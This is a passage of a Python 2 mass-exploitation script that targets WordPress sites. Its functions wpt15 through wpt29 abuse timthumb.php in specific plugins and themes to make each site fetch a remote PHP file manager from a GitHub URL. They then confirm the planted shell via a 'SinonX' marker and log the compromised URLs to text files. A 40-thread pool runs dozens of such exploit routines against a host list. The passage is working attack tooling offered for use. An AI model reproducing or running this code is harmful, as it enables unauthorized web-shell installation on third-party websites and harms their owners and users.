			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/zingiri-web-shop/fws/addons/timthumb/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/zingiri-web-shop/fws/addons/timthumb/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt15(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/jquery-slider-for-featured-content/scripts/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/jquery-slider-for-featured-content/scripts/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/jquery-slider-for-featured-content/scripts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/jquery-slider-for-featured-content/scripts/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/jquery-slider-for-featured-content/scripts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt16(host):

	try:

	
	
		
		host = host.strip()
		


		izo = requests.get(host+"/wp-content/plugins/rent-a-car/libs/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/rent-a-car/libs/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/rent-a-car/libs/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/rent-a-car/libs/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/rent-a-car/libs/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt17(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/seo-image-galleries/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/seo-image-galleries/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/seo-image-galleries/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/seo-image-galleries/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/seo-image-galleries/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt18(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/shortcodes-ultimate/lib/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/shortcodes-ultimate/lib/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/shortcodes-ultimate/lib/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/shortcodes-ultimate/lib/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/shortcodes-ultimate/lib/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt19(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/wp-marketplace/libs/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/wp-marketplace/libs/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/wp-marketplace/libs/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/wp-marketplace/libs/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/wp-marketplace/libs/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt20(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/themes/premiumnews/scripts/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/themes/premiumnews/scripts/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/themes/premiumnews/scripts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/premiumnews/scripts/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/premiumnews/scripts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt21(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/themes/premiumnews/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/themes/premiumnews/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/themes/premiumnews//cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/premiumnews/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/premiumnews/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt22(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/themes/premiumnews/tools/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/themes/premiumnews/tools/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/themes/premiumnews/tools/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/premiumnews/tools/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/premiumnews/tools/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt23(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/themes/restorante/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/themes/restorante/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/themes/restorante/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/restorante/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/restorante/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt24(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/themes/wootube/functions/thumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/themes/wootube/functions/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/themes/wootube/functions/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/wootube/functions/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/wootube/functions/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt25(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/themes/wp-newspaper/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/themes/wp-newspaper/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/themes/wp-newspaper/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/wp-newspaper/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/wp-newspaper/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt26(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/themes/wp-newsmagazine/scripts/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/themes/wp-newsmagazine/scripts/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/themes/wp-newsmagazine/scripts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/wp-newsmagazine/scripts/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/wp-newsmagazine/scripts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt27(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt28(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/themes/Envisioned/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/themes/Envisioned/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/themes/Envisioned/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/Envisioned/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/Envisioned/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def wpt29(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/themes/newspro/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/themes/newspro/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/themes/newspro/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/newspro/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/themes/newspro/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def main():		

	for i in ListPass:
		try:
			i = i.strip()
			data=lear(i)
			data=impo(i)
			data=cher(i)
			data=conl(i)
			data=izxc(i)			
			data=Mana(i)
			data=woo(i)
			data=rev(i)
			data=revs(i)
			data=prop(i)
			data=refl(i)
			data=WPma(i)
			data=WPxx(i)
			data=ads(i)
			data=shov(i)
			data=ads(i)
			data=dzs(i)
			data=clac(i)
			data=voo(i)
			data=gomn(i)
			data=gomc(i)
			data=opxy(i)			
			data=imdb(i)
			data=sosx(i)
			data=chig(i)
			data=dvpx(i)
			data=dvpy(i)
			data=wobu(i)
			data=grav(i)
			data=grad(i)			
			data=tevx(i)
			data=even(i)
			data=seob(i)
			data=mapx(i)
			data=izop(i)
			data=evez(i)
			data=alpx(i)
			data=bcpx(i)
			data=chis(i)
			data=spat(i)
			data=rexo(i)
			data=xwyz(i)
			data=xwab(i)
			data=avso(i)
			data=brai(i)
			data=ghos(i)
			data=syno(i)
			data=ghob(i)
			data=ecba(i)
			data=ecbt(i)
			data=ecbn(i)			
			data=ecob(i)
			data=chiz(i)
			data=ecvh(i)
			data=ecvf(i)
			data=ecor(i)
			data=assr(i)
			data=ecvb(i)
			data=ahab(i)
			data=ahad(i)
			data=ahhk(i)
			data=xabc(i)
			data=azbt(i)
			data=xabf(i)
			data=xabl(i)
			data=clay(i)
			data=udeg(i)
			data=barf(i)
			data=bard(i)
			data=barm(i)
			data=pinb(i)
			data=clat(i)
			data=picx(i)
			data=reht(i)
			data=memb(i)
			data=memr(i)
			data=izxt(i)
			data=wopc(i)
			data=wpt1(i)
			data=wpt2(i)
			data=wpt3(i)
			data=wpt4(i)
			data=wpt5(i)
			data=wpt6(i)
			data=wpt7(i)
			data=wpt8(i)
			data=wpt9(i)
			data=wpt10(i)
			data=wpt11(i)
			data=wpt12(i)
			data=wpt13(i)
			data=wpt14(i)
			data=wpt15(i)
			data=wpt16(i)
			data=wpt17(i)
			data=wpt18(i)
			data=wpt19(i)
			data=wpt20(i)
			data=wpt21(i)
			data=wpt22(i)
			data=wpt23(i)
			data=wpt24(i)
			data=wpt25(i)
			data=wpt26(i)
			data=wpt27(i)
			data=wpt28(i)
			data=wpt29(i)			
		except:
			pass
		
ListPass = open(sys.argv[1], 'r').readlines()		
pool = ThreadPool(40)
pool.map(lear, ListPass)
pool.map(impo, ListPass)
pool.map(cher, ListPass)
pool.map(conl, ListPass)
pool.map(izxc, ListPass)
pool.map(Mana, ListPass)
pool.map(woo, ListPass)
pool.map(rev, ListPass)
pool.map(revs, ListPass)
pool.map(prop, ListPass)
pool.map(refl, ListPass)
pool.map(WPma, ListPass)
pool.map(WPxx, ListPass)
pool.map(ads, ListPass)
pool.map(shov, ListPass)
pool.map(dzs, ListPass)
pool.map(clac, ListPass)
pool.map(voo, ListPass)
pool.map(gomn, ListPass)
pool.map(gomc, ListPass)
pool.map(opxy, ListPass)
pool.map(imdb, ListPass)
pool.map(sosx, ListPass)
pool.map(chig, ListPass)
pool.map(dvpx, ListPass)
pool.map(dvpy, ListPass)
pool.map(wobu, ListPass)
pool.map(grav, ListPass)
pool.map(grad, ListPass)
pool.map(tevx, ListPass)
pool.map(even, ListPass)
pool.map(seob, ListPass)
pool.map(mapx, ListPass)
pool.map(izop, ListPass)
pool.map(evez, ListPass)
pool.map(alpx, ListPass)
pool.map(bcpx, ListPass)
pool.map(chis, ListPass)
pool.map(spat, ListPass)
pool.map(rexo, ListPass)
pool.map(xwyz, ListPass)
pool.map(xwab, ListPass)
pool.map(avso, ListPass)
pool.map(brai, ListPass)
pool.map(ghos, ListPass)
pool.map(syno, ListPass)
pool.map(ghob, ListPass)
pool.map(ecba, ListPass)
pool.map(ecbt, ListPass)
pool.map(ecbn, ListPass)
pool.map(ecob, ListPass)
pool.map(chiz, ListPass)
pool.map(ecvh, ListPass)
pool.map(ecvf, ListPass)
pool.map(ecor, ListPass)
pool.map(assr, ListPass)
pool.map(ecvb, ListPass)
pool.map(ahab, ListPass)
pool.map(ahad, ListPass)
pool.map(ahhk, ListPass)
pool.map(xabc, ListPass)
pool.map(azbt, ListPass)
pool.map(xabf, ListPass)
pool.map(xabl, ListPass)
pool.map(clay, ListPass)
pool.map(udeg, ListPass)
pool.map(barf, ListPass)
pool.map(bard, ListPass)
pool.map(barm, ListPass)
pool.map(pinb, ListPass)
pool.map(clat, ListPass)
pool.map(picx, ListPass)
pool.map(reht, ListPass)
pool.map(memb, ListPass)
pool.map(memr, ListPass)
pool.map(izxt, ListPass)
pool.map(wopc, ListPass)
pool.map(wpt1, ListPass)
pool.map(wpt2, ListPass)
pool.map(wpt3, ListPass)
pool.map(wpt4, ListPass)
pool.map(wpt5, ListPass)
pool.map(wpt6, ListPass)
